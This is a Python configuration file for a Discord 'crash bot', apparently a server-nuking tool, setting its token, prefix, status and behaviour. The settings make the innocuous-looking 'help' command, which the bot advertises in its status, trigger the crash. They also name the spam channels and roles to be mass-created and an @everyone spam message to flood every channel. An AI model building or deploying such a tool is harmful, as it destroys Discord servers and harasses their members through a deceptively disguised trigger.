token = '' # bot token, it can be found on https://discord.com/developers/applications/

prefix = 'cp!' # bot command prefix

status = f'{prefix}help' # bot game status in discord

command_names = ['help', 'crash'] # list of commands that trigger crash

channels_names = 'server-crashed' # the name of the channels that will be created during the crash

roles_names = 'Server Crashed' # the name of the roles that will be created during the crash

spam_message = '@everyone\nServer crashed\nCrash bot by <https://github.com/metamorrphosis/discord-crash-bot>' # the message that will be spammed to all channels
